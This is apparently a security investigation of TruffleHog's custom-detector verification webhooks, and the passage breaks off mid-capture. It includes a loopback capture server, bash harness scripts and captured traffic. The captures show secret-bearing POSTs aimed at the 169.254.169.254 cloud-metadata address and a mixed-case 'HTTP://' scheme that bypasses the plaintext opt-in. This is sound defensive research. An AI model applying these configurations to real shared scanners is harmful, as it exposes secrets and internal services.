# TruffleHog Custom-Detector Webhook Verification — Security Investigation

**Target:** `trufflesecurity/trufflehog` at commit `e42153d44a5e5c37c1bd0c70e074781e9edcb760` (source branch `trufflehog_e42153d44a5e`).
**Question:** Is it safe to run TruffleHog in an environment where multiple teams supply their own custom-detector configurations? Specifically, can an actor who controls a detector configuration abuse the **verification webhook** subsystem (SSRF, MITM, amplification, exfiltration, ReDoS)?
**Method:** Evidence-first. The scanner was built from source and driven through its real `--config` entry point against synthetic data while a controllable loopback server captured the exact traffic. Every claim below is backed by the output of the command that produced it, plus exact `file:line` citations into the source. Output blocks are shown complete and unedited except where a block is explicitly filtered for length — in those cases the filtering command (`grep`/`head`/`sed`) is visible inline and the complete raw capture is preserved on disk and indexed in the command-indexed evidence appendix (§14).

---

## 0. How to read this document — provenance legend

Every evidence block is tagged with one of four labels:

- **[OBSERVED]** — captured directly from running the canonically-built scanner through the real `--config` entry point. The exact command and its complete, unedited stdout/stderr are shown next to the claim.
- **[SOURCE-DERIVED / INFERRED]** — a statement read from the source at a cited `file:line` rather than (or in addition to) being observed at runtime. Anything not backed by a capture is marked inferred.
- **[CORROBORATED]** — an external, authoritative reference (official documentation) that supports an observed/derived claim. All external sources are listed with exact titles and stable URLs in §10.
- **[NON-CANONICAL COMPARISON]** — a deliberately out-of-band measurement (e.g. a *different* regex engine) shown only for contrast. It is **not** TruffleHog behavior and never substitutes for a canonical run.

Ground rules honored throughout:

- All runtime output was produced through TruffleHog's own `CustomRegex` detector loaded via `--config` — never a mock, debug hook, or synthetic bypass.
- Primary probes (SSRF, TLS, amplification, exfiltration, headers, cache) use the canonical **`HogTokenDetector`** from `pkg/custom_detectors/CUSTOM_DETECTORS.md`. The ReDoS probe (§8) uses a custom detector named **`ReDoSProbe`** — still the real `CustomRegex` path, just a different pattern. Detector attribution is called out per section and reconciled in the coverage pass (§12).
- All secret material shown is synthetic (the example token and authorization header from the project's own documentation).
- Reproduction is **safe**: no host-wide firewall/NAT rules are used. Egress toward a cloud-metadata address is captured by routing it through a **loopback-only** HTTP proxy (see §3.2), so the real metadata service is never contacted.

---

## 1. Summary — direct answers

1. **SSRF reachability — YES, unrestricted at the configuration layer.** The only endpoint guard, `ValidateVerifyEndpoint` [pkg/custom_detectors/validation.go:35-44], performs **no** host/IP allow- or deny-listing; its sole rule is that a plaintext `http://` endpoint must set `unsafe: true`. A webhook aimed at `http://169.254.169.254/latest/meta-data/iam/security-credentials/` is accepted and a secret-bearing `POST` is dispatched to it. **[OBSERVED]** (§3). Worse, that one gate is itself **case-sensitive** — `strings.HasPrefix(endpoint, "http://")` [validation.go:40] — so a mixed-case scheme (`HTTP://`, `Http://`, `hTtP://`) **bypasses** the `unsafe` requirement entirely and sends the secret in **cleartext** with no opt-in. **[OBSERVED]** (§3.5). What this proves is *request reachability + secret-bearing POST egress*, **not** cloud-credential retrieval (§3.6).
2. **TLS / MITM — default strict verification applies, but is bypassable by a redirect downgrade.** Custom detectors use `common.SaneHttpClient()` [pkg/common/http.go:223-229], which sets **no** `TLSClientConfig`, so Go's default certificate + hostname verification governs HTTPS. An untrusted self-signed endpoint is **rejected before any application bytes are sent** (server sees 0 requests); trusting the same certificate lets the identical secret-bearing request through. **[OBSERVED]** (§4.2). Hostname verification is enforced **independently of CA trust**: a certificate issued by a *trusted* CA but bearing a non-matching SAN is also rejected with 0 requests. **[OBSERVED]** (§4.3). A network MITM without a trusted certificate therefore cannot silently intercept HTTPS verification traffic. **However**, a config that uses `https://` (which needs no `unsafe`) can still be **downgraded to cleartext by a redirect the endpoint controls**: a trusted HTTPS hop returning a `307` to an `http://` target causes TruffleHog to **replay the secret in the clear**, with no `unsafe` re-check. **[OBSERVED]** (§6.5). Plaintext `http://` (with `unsafe: true`, or via the case bypass of §3.5) likewise removes TLS protection entirely.
3. **Amplification — one verification per match *permutation*, capped at 100 *per keyword-match region* (per `FromData` invocation), not per chunk and not scan-wide.** `maxTotalMatches = 100` [pkg/custom_detectors/custom_detectors.go:23] bounds one `FromData` call, and the engine invokes `FromData` **once per merged keyword-match region** [pkg/engine/engine.go:1061-1070]; a single chunk that contains several non-merging regions therefore exceeds 100 (observed: one 8241-byte chunk → **120** verifications). The total is multiplied further by the number of chunks, the number of configured verifiers, and any redirects. **[OBSERVED]** (§5).
4. **Data exfiltration — the matched secret is JSON-marshaled and POSTed with attacker-chosen headers, to every configured verifier, and replayed across redirects; the endpoint's 200 response is read back (first 200 bytes) into CLI output.** Headers are key-canonicalized and value-left-trimmed (not byte-verbatim), the injected `User-Agent: TruffleHog` is a **default that a configured header overrides**, and `Host`/`Content-Length` are regenerated (§6.6). The 200 response body is read **in full into memory** (`io.ReadAll` [custom_detectors.go:253]) before being truncated to 200 bytes, so a large body inflates scanner RSS (observed 128 MiB body → ~599 MiB peak RSS) — a memory-amplification surface (§6.8). **[OBSERVED]** (§6).
5. **ReDoS — not a concern for the matching engine.** Patterns compile with Go's `regexp` (RE2) [pkg/custom_detectors/validation.go:23-33], which guarantees linear-time matching; the classic catastrophic pattern does not blow up. **[OBSERVED]** + **[CORROBORATED]** (§8).
6. **Threat model — the trust boundary is whoever supplies `--config`.** That party chooses the endpoint (SSRF egress + secret-bearing POST), the headers, the regex, and — via redirects — additional destinations, can read back a bounded slice of each endpoint's response, can inflate scanner memory via an oversized response body (§6.8), and can poison another detector's verification result through the shared, non-isolated in-process cache (§7.6). **[OBSERVED/SOURCE-DERIVED]** (§9).

### 1.1 Corrections to the initial working hypothesis (all OBSERVED)

- A TLS/transport failure yields status **`unverified`**, not `unknown`: the error is swallowed by `if err != nil { continue }` [custom_detectors.go:241-242] with no `SetVerificationError` (§4.5).
- `successRanges` is a **runtime no-op** at this commit; only HTTP 200 marks a result verified [custom_detectors.go:249] (§6.6).
- The 100 limit is **per keyword-match region** (per `FromData` invocation), not per chunk and not scan-wide — a single chunk containing two non-merging regions was observed issuing **120** verifications (§5).
- The verification cache dedupes on `hash(Raw + RawV2 + DetectorType)` and only short-circuits when **every** result is a cache hit (§7). Two consequences correct the naive "cache bounds outbound traffic / isolates detectors" hypothesis: (a) the dedup is **concurrency-dependent** — at `--concurrency=1` it saved 68 of 76 POSTs, but at `--concurrency=128` it saved 0 (identical to cache-off), so it must not be relied on to cap verification volume (§7.5); and (b) because `DetectorType` is fixed at `904` for every `CustomRegex` and the detector *name* is not in the key, the cache is **not isolated across detectors** — one detector matching the same `Raw` bytes can serve its verifier's status to another, poisoning it (§7.6).

---

## 2. Environment, build & reproducibility

### 2.1 Toolchain and canonical build

**[OBSERVED]** The scanner was built with the project's own toolchain (`CGO_ENABLED=0 go build`, Go `go1.24.2`) exactly as the `Dockerfile` prescribes. A successful `go build` prints nothing on stdout/stderr; the exit code and resulting binary are the evidence. Command and complete output:
```text
===== go version =====
go version go1.24.2 linux/amd64
===== go directive / toolchain (go.mod) =====
go 1.23.1
toolchain go1.24.2
===== canonical build (CGO_ENABLED=0 go build -o /tmp/trufflehog .) =====
BUILD_EXIT=0
(note: a successful 'go build' prints nothing on stdout/stderr)
===== binary size + version =====
bytes=194309802  path=/tmp/trufflehog
trufflehog dev
===== capture_server.py provenance =====
lines=112
sha256=6faf8a60da0f4b710a7b9963692f9d20c69d174883339572d043c9bf8518efd0
===== generate self-signed TLS cert (loopback, for TLS scenario) =====
-----
subject=CN=127.0.0.1
issuer=CN=127.0.0.1
X509v3 Subject Alternative Name:
    IP Address:127.0.0.1
```

The reported binary version is `dev` because this is a local source build (`pkg/version.BuildVersion = "dev"`); this is stated rather than presented as a released version. `go.mod` declares `go 1.23.1` with `toolchain go1.24.2`, so the installed `go1.24.2` toolchain is used with no auto-download.

### 2.2 Canonical entry point

**[SOURCE-DERIVED / INFERRED]** Custom detectors are supplied **only** through the `--config` flag [main.go:70]. `config.Read` [main.go:463] calls `config.NewYAML`, which performs a strict proto-YAML unmarshal (`protoyaml.UnmarshalStrict` [pkg/config/config.go:30]) and constructs each detector with `NewWebhookCustomRegex` [pkg/config/config.go:35-36]. That constructor runs the validators (`ValidateKeywords`, `ValidateRegex`, `ValidateVerifyEndpoint`, `ValidateVerifyHeaders`) at load time. A malformed config aborts with `logFatal("error parsing the provided configuration file")` [main.go:465] — observed several times below. Every probe in this document flows through this real path.

### 2.3 The observation harness (complete, self-contained)

All observation code lives under `/tmp/th_harness` (created `drwx------`, owner-only). Two files provide the whole apparatus; both are shown in full so the investigation is independently reproducible.

**`capture_server.py`** — a configurable capture server that **binds `127.0.0.1` only**, logs every received request (method, path, headers, body) with a monotonic counter, and is driven entirely by environment variables (status code, response body, redirect target, TLS cert/key). It is threaded (so concurrent verification requests are counted correctly) and its logging is `RLock`-guarded.

```python
#!/usr/bin/env python3
"""Configurable loopback HTTP capture server for TruffleHog webhook observation.

Binds to 127.0.0.1 only. Logs every received request (method, path, headers,
body) with a monotonic counter to a log file and to stdout. Behavior is driven
by environment variables so a single program serves every probe.

Env vars:
  TH_PORT         : TCP port to bind on 127.0.0.1 (required)
  TH_STATUS       : integer HTTP status to return (default 200)
  TH_BODY         : response body string to return (default "")
  TH_LOG          : path to append request records to (default stdout only)
  TH_REDIRECT_TO  : if set, send a redirect whose Location is this value
                    (status from TH_STATUS, e.g. 301/302/303/307/308)
"""
import http.server
import os
import sys
import threading
import time

PORT = int(os.environ["TH_PORT"])
STATUS = int(os.environ.get("TH_STATUS", "200"))
BODY = os.environ.get("TH_BODY", "")
LOG = os.environ.get("TH_LOG", "")
REDIRECT_TO = os.environ.get("TH_REDIRECT_TO", "")

_counter = 0
_lock = threading.RLock()


def _record(text):
    with _lock:
        _record_locked(text)


def _record_locked(text):
    line = text if text.endswith("\n") else text + "\n"
    sys.stdout.write(line)
    sys.stdout.flush()
    if LOG:
        with open(LOG, "a") as fh:
            fh.write(line)


class Handler(http.server.BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def _handle(self):
        global _counter
        with _lock:
            _counter += 1
            n = _counter
        length = int(self.headers.get("Content-Length", "0") or "0")
        body = self.rfile.read(length) if length else b""
        ts = time.strftime("%Y-%m-%dT%H:%M:%S")
        lines = []
        lines.append("----- REQUEST #%d @ %s -----" % (n, ts))
        lines.append("REQUEST-LINE: %s %s %s" %
                      (self.command, self.path, self.request_version))
        for k, v in self.headers.items():
            lines.append("HEADER: %s: %s" % (k, v))
        lines.append("BODY: %s" % body.decode("utf-8", "replace"))
        lines.append("----- END REQUEST #%d -----" % n)
        _record("\n".join(lines))

        if REDIRECT_TO:
            self.send_response(STATUS)
            self.send_header("Location", REDIRECT_TO)
            self.send_header("Content-Length", "0")
            self.end_headers()
            return
        payload = BODY.encode("utf-8")
        self.send_response(STATUS)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(payload)))
        self.end_headers()
        if payload:
            self.wfile.write(payload)

    def do_GET(self):
        self._handle()

    def do_POST(self):
        self._handle()

    def do_PUT(self):
        self._handle()

    def log_message(self, fmt, *args):
        return


def main():
    server = http.server.ThreadingHTTPServer(("127.0.0.1", PORT), Handler)
    cert = os.environ.get("TH_CERT", "")
    key = os.environ.get("TH_KEY", "")
    if cert and key:
        import ssl
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(certfile=cert, keyfile=key)
        server.socket = ctx.wrap_socket(server.socket, server_side=True)
    _record("SERVER-READY port=%d status=%d redirect_to=%r log=%r pid=%d" %
            (PORT, STATUS, REDIRECT_TO, LOG, os.getpid()))
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()
```

**`scripts/lib.sh`** — shared constants (the canonical `HogTokenDetector` inputs, copied verbatim from `pkg/custom_detectors/CUSTOM_DETECTORS.md`) and server-lifecycle helpers. The teardown `trap` is installed **before** any server is started, so no process can leak on error or interrupt; `start_server` records the PID both in an in-memory array and in a persistent `$TH/harness_pids` registry (so the final standalone teardown in §13.3 can terminate exactly the processes this harness started, without any global name search) and blocks on a readiness probe; `stop_all` is idempotent and kills only those recorded PIDs by explicit number.

```bash
#!/usr/bin/env bash
# ============================================================================
# lib.sh — shared library for the TruffleHog custom-detector verification
# evidence scripts. Sourced by every scenario script (01_*.sh .. 09_*.sh).
#
# Provides:
#   * canonical HogTokenDetector inputs (verbatim from
#     pkg/custom_detectors/CUSTOM_DETECTORS.md)
#   * loopback-ONLY capture-server lifecycle helpers with PID tracking,
#     readiness probing, and an idempotent teardown trap installed BEFORE
#     any server is ever started (so no process can leak on error/interrupt).
# ============================================================================
set -u

TH=/tmp/th_harness
SRV="$TH/capture_server.py"                       # configurable loopback server
BIN=/tmp/trufflehog                               # canonically-built scanner
REPO=/tmp/blitzy/trufflehog/blitzy-9c3c28c1-fc53-4978-a088-1b1f05880502_0dd9ac
EV="$TH/ev2"                                      # clean Phase-2 evidence dir
mkdir -p "$EV"

# Canonical inputs — copied verbatim from pkg/custom_detectors/CUSTOM_DETECTORS.md
CANON_TOKEN='pOIAj9x47WT5qElx5JrI3e7O714HgaAIz2ck9sVn'
REGEX='[^A-Za-z0-9+\/]{0,1}([A-Za-z0-9+\/]{40})[^A-Za-z0-9+\/]{0,1}'
AUTH='Authorization: super secret authorization header'

# ---- process bookkeeping + teardown (installed before any mutation) --------
PIDS=()
stop_all() {
  local p
  for p in "${PIDS[@]:-}"; do
    [ -n "${p:-}" ] && kill "$p" 2>/dev/null || true
  done
  wait 2>/dev/null || true
  PIDS=()
}
trap stop_all EXIT INT TERM

# pick_ports N -> prints N free loopback TCP ports
pick_ports() {
  python3 - "$1" <<'PY'
import socket,sys
n=int(sys.argv[1]); socks=[]; out=[]
for _ in range(n):
    s=socket.socket(); s.bind(("127.0.0.1",0)); out.append(s.getsockname()[1]); socks.append(s)
for s in socks: s.close()
print(" ".join(map(str,out)))
PY
}

# start_server PORT STATUS LOG [BODY] [REDIRECT_TO] [CERT] [KEY]
# starts the capture server (loopback only), records its PID, waits until it
# is accepting connections. Sets global SRV_PID.
start_server() {
  local port="$1" status="$2" log="$3" body="${4:-}" redir="${5:-}" cert="${6:-}" key="${7:-}"
  : > "$log"
  TH_PORT="$port" TH_STATUS="$status" TH_LOG="$log" TH_BODY="$body" \
    TH_REDIRECT_TO="$redir" TH_CERT="$cert" TH_KEY="$key" \
    nohup python3 "$SRV" >/dev/null 2>&1 &
  SRV_PID=$!
  PIDS+=("$SRV_PID")
  echo "$SRV_PID" >> "$TH/harness_pids"   # persistent owned-PID registry, read by the final teardown (§13.3)
  python3 - "$port" <<'PY'
import socket,sys,time
p=int(sys.argv[1])
for _ in range(50):
    s=socket.socket(); s.settimeout(0.2); r=s.connect_ex(("127.0.0.1",p)); s.close()
    if r==0:
        print("readiness: connect_ex=0 (listening)"); sys.exit(0)
    time.sleep(0.1)
print("readiness: NOT LISTENING"); sys.exit(1)
PY
}

# posts LOG -> count of captured HTTP requests in a server log
posts() { grep -c 'REQUEST-LINE' "$1" 2>/dev/null || echo 0; }

# make_canon_data DIR -> writes one canonical scan file with the HogTokenDetector
# keyword ("hog") and the canonical 40-char token positioned so the full match
# carries a leading space and trailing newline (reproducing the documented body).
make_canon_data() {
  local d="$1"; mkdir -p "$d"
  printf 'hog api credential:\n %s\n' "$CANON_TOKEN" > "$d/data.txt"
}
```

Each scenario below is a small script that `source`s `lib.sh`, generates its own config and synthetic scan data through the canonical path, runs the scanner, and shows the complete captured output. Scripts are reproduced in full next to their output.

### 2.4 On-the-wire body shape

**[SOURCE-DERIVED / INFERRED]** The request body is `json.Marshal` of `map[string]map[string][]string{ detectorName: { regexName: matches } }` [custom_detectors.go:214-216]. For the canonical `HogTokenDetector`, `matches[0]` is the full regex match (here carrying a leading space and trailing newline from the surrounding `[^A-Za-z0-9+/]{0,1}` anchors) and `matches[1]` is the capture group. This shape is confirmed byte-for-byte in every capture below, e.g. `{"HogTokenDetector":{"token":[" pOIAj9x47WT5qElx5JrI3e7O714HgaAIz2ck9sVn\n","pOIAj9x47WT5qElx5JrI3e7O714HgaAIz2ck9sVn"]}}`.

---

## 3. SSRF reachability

**Direct answer:** At the configuration layer there is **no** address filtering. A verification webhook may point at any host — loopback, RFC-1918, or the `169.254.169.254` link-local cloud-metadata address — and TruffleHog will dispatch a secret-bearing `POST` to it. The only gate is a plaintext opt-in, not an SSRF control.

### 3.1 The only guard in the code path

**[SOURCE-DERIVED / INFERRED]** `ValidateVerifyEndpoint` [pkg/custom_detectors/validation.go:35-44] is the entire endpoint policy. After an empty-string check, its **only** rule is:

- if the endpoint starts with `http://` **and** `unsafe` is not `true`, reject with `"http endpoint must have unsafe=true"` [validation.go:40-42].

There is no parsing of the host, no comparison against link-local/RFC-1918/metadata ranges, no allowlist, and no denylist. `https://` endpoints are accepted with no `unsafe` requirement. (The generated proto validation only calls `url.Parse(endpoint)` and has "no validation rules for Unsafe" — it likewise performs no address filtering.)

### 3.2 Safe capture method (and why it is safe)

**[OBSERVED + method rationale]** To observe the egress toward `169.254.169.254` **without ever contacting the real metadata service**, the outbound request is routed through a loopback-only HTTP proxy. This is sound because `SaneHttpClient`'s transport sets `Proxy: http.ProxyFromEnvironment` [pkg/common/http.go:212], and Go's proxy resolver routes an `http://169.254.169.254/latest/meta-data/iam/security-credentials/` target **through** an `HTTP_PROXY` while sending loopback targets directly. The capture server binds `127.0.0.1` only; TruffleHog dials the loopback proxy, which logs the request in absolute-URI form and returns a canned `200`. **No route to, DNS for, or packet toward the real `169.254.169.254` is ever created** — the destination IP appears only inside the request line delivered to our loopback process. This replaces the unsafe host-wide `iptables` NAT approach entirely: nothing global on the host is mutated, and the per-scenario `trap` guarantees teardown.

### 3.3 Evidence — secret-bearing POST reaching the metadata endpoint

The scenario script (self-contained; sources `lib.sh` from §2.3):

```bash
# ---- scripts/04_ssrf.sh ----
#!/usr/bin/env bash
# Evidence: no address filtering in ValidateVerifyEndpoint. A metadata-endpoint
# webhook is accepted at config load; the outbound POST is captured SAFELY by
# routing it through a loopback HTTP proxy (Go honors http.ProxyFromEnvironment),
# so the real 169.254.169.254 is NEVER contacted. Also shows http-without-unsafe
# rejection and https-without-unsafe acceptance at load time.
source /tmp/th_harness/scripts/lib.sh
read PROXY < <(pick_ports 1)
DATA="$TH/data_ssrf"; make_canon_data "$DATA"
META='http://169.254.169.254/latest/meta-data/iam/security-credentials/'

echo "################ SAFE metadata egress capture via loopback HTTP_PROXY ################"
echo "proxy will bind ONLY 127.0.0.1:$PROXY ; endpoint points at $META"
CFG="$TH/ssrf_meta.yaml"
cat > "$CFG" <<CFG
detectors:
  - name: HogTokenDetector
    keywords: [hog]
    regex:
      token: '$REGEX'
    verify:
      - endpoint: $META
        unsafe: true
        headers: ["$AUTH"]
CFG
echo "--- config (endpoint = cloud metadata address) accepted at load? ---"
L="$EV/ssrf_proxy.log"; start_server "$PROXY" 200 "$L"
CLI="$EV/ssrf_cli.out"
# HTTP_PROXY routes 169.254.169.254 to the loopback proxy; NO_PROXY empty so it applies.
env HTTP_PROXY="http://127.0.0.1:$PROXY" HTTPS_PROXY="http://127.0.0.1:$PROXY" NO_PROXY="" no_proxy="" \
  "$BIN" filesystem "$DATA" --config="$CFG" --no-update >"$CLI" 2>&1
echo "TRUFFLEHOG_EXIT=$?"
echo "--- CLI result (config loaded => no parse error; result produced) ---"
grep -E 'Found (verified|unverified) result|verified_secrets|unverified_secrets|Response:' "$CLI"
echo "--- proxy-captured request (the secret-bearing POST aimed at the metadata IP) ---"; cat "$L"
echo "--- NO-LIVE-DATA PROOF ---"
echo "proxy pid we own = $SRV_PID (bound 127.0.0.1:$PROXY only). TruffleHog dialed the loopback"
echo "proxy, which logged the attempt and returned our canned 200. The real 169.254.169.254 was"
echo "never dialed (Go sent the request to the proxy in absolute-URI form, shown above)."
stop_all

echo ""
echo "################ Load-time gate: http:// WITHOUT unsafe -> REJECTED ################"
CFGBAD="$TH/ssrf_http_nounsafe.yaml"
cat > "$CFGBAD" <<CFG
detectors:
  - name: HogTokenDetector
    keywords: [hog]
    regex:
      token: '$REGEX'
    verify:
      - endpoint: http://169.254.169.254/latest/meta-data/
        headers: ["$AUTH"]
CFG
env NO_PROXY=127.0.0.1 no_proxy=127.0.0.1 "$BIN" filesystem "$DATA" --config="$CFGBAD" --no-update 2>&1 \
  | grep -iE 'error parsing|unsafe|http endpoint' | head -3

echo ""
echo "################ Load-time gate: https:// WITHOUT unsafe -> ACCEPTED (no unsafe required) ################"
read HP < <(pick_ports 1)
CFGHS="$TH/ssrf_https_nounsafe.yaml"
cat > "$CFGHS" <<CFG
detectors:
  - name: HogTokenDetector
    keywords: [hog]
    regex:
      token: '$REGEX'
    verify:
      - endpoint: https://127.0.0.1:$HP/
        headers: ["$AUTH"]
CFG
OUT=$(env NO_PROXY=127.0.0.1 no_proxy=127.0.0.1 "$BIN" filesystem "$DATA" --config="$CFGHS" --no-update 2>&1)
if echo "$OUT" | grep -qi 'error parsing the provided configuration'; then
  echo "RESULT: https-without-unsafe was REJECTED (unexpected)"
else
  echo "RESULT: https-without-unsafe ACCEPTED at load (no parse error) — proceeds to verify"
  echo "$OUT" | grep -E 'Found (verified|unverified) result|unverified_secrets' | head -2
fi
```

Complete, unedited output:

```text
################ SAFE metadata egress capture via loopback HTTP_PROXY ################
proxy will bind ONLY 127.0.0.1:40243 ; endpoint points at http://169.254.169.254/latest/meta-data/iam/security-credentials/
--- config (endpoint = cloud metadata address) accepted at load? ---
readiness: connect_ex=0 (listening)
TRUFFLEHOG_EXIT=0
--- CLI result (config loaded => no parse error; result produced) ---
✅ Found verified result 🐷🔑
Response:
2026-07-13T18:51:41Z	info-0	trufflehog	finished scanning	{"chunks": 1, "bytes": 62, "verified_secrets": 1, "unverified_secrets": 0, "scan_duration": "6.165447ms", "trufflehog_version": "dev", "verification_caching": {"Hits":0,"Misses":1,"HitsWasted":0,"AttemptsSaved":0,"VerificationTimeSpentMS":1}}
--- proxy-captured request (the secret-bearing POST aimed at the metadata IP) ---
SERVER-READY port=40243 status=200 redirect_to='' log='/tmp/th_harness/ev2/ssrf_proxy.log' pid=115920
----- REQUEST #1 @ 2026-07-13T18:51:41 -----
REQUEST-LINE: POST http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1
HEADER: Host: 169.254.169.254
HEADER: User-Agent: TruffleHog
HEADER: Content-Length: 121
HEADER: Authorization: super secret authorization header
HEADER: Accept-Encoding: gzip
BODY: {"HogTokenDetector":{"token":[" pOIAj9x47WT5qElx5JrI3e7O714HgaAIz2ck9sVn\n","pOIAj9x47WT5qElx5JrI3e7O714HgaAIz2ck9sVn"]}}
----- END REQUEST #1 -----
--- NO-LIVE-DATA PROOF ---
proxy pid we own = 115920 (bound 127.0.0.1:40243 only). TruffleHog dialed the loopback
proxy, which logged the attempt and returned our canned 200. The real 169.254.169.254 was
never dialed (Go sent the request to the proxy in absolute-URI form, shown above).

################ Load-time gate: http:// WITHOUT unsafe -> REJECTED ################
2026-07-13T18:51:43Z	error	trufflehog	error parsing the provided configuration file	{"error": "http endpoint must have unsafe=true"}

################ Load-time gate: https:// WITHOUT unsafe -> ACCEPTED (no unsafe required) ################
RESULT: https-without-unsafe ACCEPTED at load (no parse error) — proceeds to verify
Found unverified result 🐷🔑❓
2026-07-13T18:51:44Z	info-0	trufflehog	finished scanning	{"chunks": 1, "bytes": 62, "verified_secrets": 0, "unverified_secrets": 1, "scan_duration": "4.984507ms", "trufflehog_version": "dev", "verification_caching": {"Hits":0,"Misses":1,"HitsWasted":0,"AttemptsSaved":0,"VerificationTimeSpentMS":0}}
```

**What the capture shows (OBSERVED):** the config naming the metadata endpoint loads with no parse error (`TRUFFLEHOG_EXIT=0`); the loopback proxy receives `POST http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1` with `Host: 169.254.169.254`, the injected `User-Agent: TruffleHog`, `Content-Length: 121`, the verbatim `Authorization` header, and the synthetic secret in the JSON body. The real metadata IP is never dialed (the request was intercepted at `127.0.0.1`).

### 3.4 Secondary / edge cases (in the same run, OBSERVED)

- **`http://` without `unsafe: true` → rejected at load:** `error parsing the provided configuration file {"error": "http endpoint must have unsafe=true"}`. This is a *plaintext opt-in*, not an SSRF protection: it only forces the author to acknowledge cleartext; it does not restrict the destination.
- **`https://` without `unsafe: true` → accepted at load** and proceeds to verify. `unsafe` governs *plaintext*, not *destination*.

### 3.5 Mixed-case scheme spelling bypasses the plaintext `unsafe` gate (OBSERVED)

The single gate that §3.1 established — "a plaintext `http://` endpoint must set `unsafe: true`" — is itself trivially bypassable, because the check is **case-sensitive**. The guard is `if strings.HasPrefix(endpoint, "http://") && !unsafe` [pkg/custom_detectors/validation.go:40]. `strings.HasPrefix` is a byte-for-byte comparison, so an endpoint spelled `HTTP://`, `Http://`, or `hTtP://` does **not** match the lowercase literal `"http://"`; the branch is skipped and the config loads **without** `unsafe: true`. Go's HTTP stack then treats the URL scheme case-insensitively and dispatches an ordinary cleartext request. The net effect: an untrusted config can send a secret-bearing **cleartext** `POST` to an arbitrary host **without** even the `unsafe` acknowledgment the author would otherwise be forced to make.

The generated proto validation does not close the gap either — it only calls `url.Parse(endpoint)` and carries "no validation rules for Unsafe" [pkg/pb/custom_detectorspb/custom_detectors.pb.validate.go:335,347] — so an uppercase scheme parses cleanly and is accepted at load.

Scenario script (self-contained; sources `lib.sh` from §2.3):

```bash
# ---- scripts/10_mixedcase.sh ----
#!/usr/bin/env bash
# Evidence: the http-unsafe gate in ValidateVerifyEndpoint uses a CASE-SENSITIVE
# strings.HasPrefix(endpoint,"http://") [validation.go:40]. Mixed/upper-case
# scheme spellings (HTTP://, Http://, hTtP://) do NOT match the lowercase prefix,
# so they BYPASS the unsafe gate: the config loads WITHOUT unsafe:true and a
# secret-bearing cleartext POST is dispatched. Exact lowercase http:// is
# correctly rejected (0 egress). All through the canonical filesystem --config path.
source /tmp/th_harness/scripts/lib.sh
DATA="$TH/data_mc"; make_canon_data "$DATA"

run_case() {  # run_case LABEL SCHEME
  local label="$1" scheme="$2"
  read P < <(pick_ports 1)
  local L="$EV/mc_${label}.log"; start_server "$P" 200 "$L" >/dev/null
  local CFG="$TH/mc_${label}.yaml"
  cat > "$CFG" <<CFG
detectors:
  - name: HogTokenDetector
    keywords: [hog]
    regex:
      token: '$REGEX'
    verify:
      - endpoint: ${scheme}://127.0.0.1:$P/${label}
        headers: ["$AUTH"]
CFG
  echo "################ scheme='${scheme}://' WITHOUT unsafe key ################"
  local OUT n
  OUT=$(env NO_PROXY=127.0.0.1 no_proxy=127.0.0.1 "$BIN" filesystem "$DATA" --config="$CFG" --no-update 2>&1)
  if echo "$OUT" | grep -qi 'error parsing the provided configuration'; then
    echo "LOAD: REJECTED -> $(echo "$OUT" | grep -oiE 'http endpoint must have unsafe=true' | head -1)"
  else
    echo "LOAD: ACCEPTED (no unsafe required)"
    echo "RESULT: $(echo "$OUT" | grep -E 'Found (verified|unverified) result' | head -1)"
  fi
  n=$(grep -c '^REQUEST-LINE' "$L" 2>/dev/null); n=${n:-0}
  echo "SERVER_POSTS=$n"
  grep -m1 '^REQUEST-LINE' "$L" 2>/dev/null || echo "REQUEST-LINE: (none captured)"
  stop_all >/dev/null 2>&1
  echo ""
}

run_case "lower_http" "http"
run_case "UPPER_HTTP" "HTTP"
run_case "Title_Http" "Http"
run_case "mixed_hTtP" "hTtP"
```

Complete, unedited output:

```text
################ scheme='http://' WITHOUT unsafe key ################
LOAD: REJECTED -> http endpoint must have unsafe=true
SERVER_POSTS=0
REQUEST-LINE: (none captured)

################ scheme='HTTP://' WITHOUT unsafe key ################
LOAD: ACCEPTED (no unsafe required)
RESULT: ✅ Found verified result 🐷🔑
SERVER_POSTS=1
REQUEST-LINE: POST /UPPER_HTTP HTTP/1.1

################ scheme='Http://' WITHOUT unsafe key ################
LOAD: ACCEPTED (no unsafe required)
RESULT: ✅ Found verified result 🐷🔑
SERVER_POSTS=1
REQUEST-LINE: POST /Title_Http HTTP/1.1

################ scheme='hTtP://' WITHOUT unsafe key ################
LOAD: ACCEPTED (no unsafe required)
RESULT: ✅ Found verified result 🐷🔑
SERVER_POSTS=1
REQUEST-LINE: POST /mixed_hTtP HTTP/1.1
```

To confirm the bypassed request still carries the secret in cleartext, a focused capture of the `HTTP://` case (the full request as recorded by the plaintext capture server):

```bash
# ---- scripts/10b_mixedcase_body.sh ----
#!/usr/bin/env bash
# Full request capture for the HTTP:// (uppercase) bypass WITHOUT unsafe: prove
# the secret-bearing cleartext POST body egresses despite no unsafe:true opt-in.
source /tmp/th_harness/scripts/lib.sh
DATA="$TH/data_mcb"; make_canon_data "$DATA"
read P < <(pick_ports 1)
L="$EV/mc_body.log"; start_server "$P" 200 "$L" >/dev/null
CFG="$TH/mc_body.yaml"
cat > "$CFG" <<CFG
detectors:
  - name: HogTokenDetector
    keywords: [hog]
    regex:
      token: '$REGEX'
    verify:
      - endpoint: HTTP://127.0.0.1:$P/meta
        headers: ["$AUTH"]
CFG
echo "--- config verify block (scheme is UPPERCASE 'HTTP://', NO unsafe key) ---"
sed -n '/verify:/,$p' "$CFG"
env NO_PROXY=127.0.0.1 no_proxy=127.0.0.1 "$BIN" filesystem "$DATA" --config="$CFG" --no-update >/dev/null 2>&1
echo "--- server-captured request (COMPLETE, plaintext HTTP server) ---"
sed -n '/^----- REQUEST #1/,/^----- END REQUEST #1/p' "$L"
stop_all >/dev/null 2>&1
```

Complete, unedited output:

```text
--- config verify block (scheme is UPPERCASE 'HTTP://', NO unsafe key) ---
    verify:
      - endpoint: HTTP://127.0.0.1:55771/meta
        headers: ["Authorization: super secret authorization header"]
--- server-captured request (COMPLETE, plaintext HTTP server) ---
----- REQUEST #1 @ 2026-07-14T01:49:48 -----
REQUEST-LINE: POST /meta HTTP/1.1
